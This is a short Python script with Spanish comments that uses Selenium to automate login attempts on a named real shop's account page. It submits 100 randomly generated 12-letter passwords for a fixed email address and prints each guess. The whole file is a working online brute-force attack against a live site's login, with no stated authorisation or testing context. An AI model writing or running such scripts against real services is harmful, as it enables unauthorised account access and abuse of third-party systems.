#Para este código se ocupó Selenium, en el navegador Google Chrome.

import time
import string
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()

#Se ingresa el link del login de la página.

driver.get("https://neeks.cl/mi-cuenta/")
time.sleep(5)

#Colocar los tipos de caracteres para generar las contraseñas aleatorias.
#En este caso solo puse minúsculas y mayúsculas, porque la contraseña permitía 2 tipos como mínimo en este sitio.

base = string.ascii_lowercase + string.ascii_uppercase

print(base)
for x in range(100):

    #Id de nombre de usuario del sitio. 

    usr = driver.find_element_by_id("username")
    usr.clear()

    #Correo de la cuenta.

    usr.send_keys("udbllhtefc@appzily.com")

    #Id de la contraseña del sitio. 

    psw = driver.find_element_by_id("password")
    str = ''.join(random.choice(base) for i in range(12))
    psw.send_keys(str)
    print(str)

    #Xpath del botón de iniciar sesión.

    clk = driver.find_element_by_xpath("//*[@id='wrapper']/div[1]/div/div/div/div/div/div/div[2]/div/div[1]/form/p[4]/button").click()
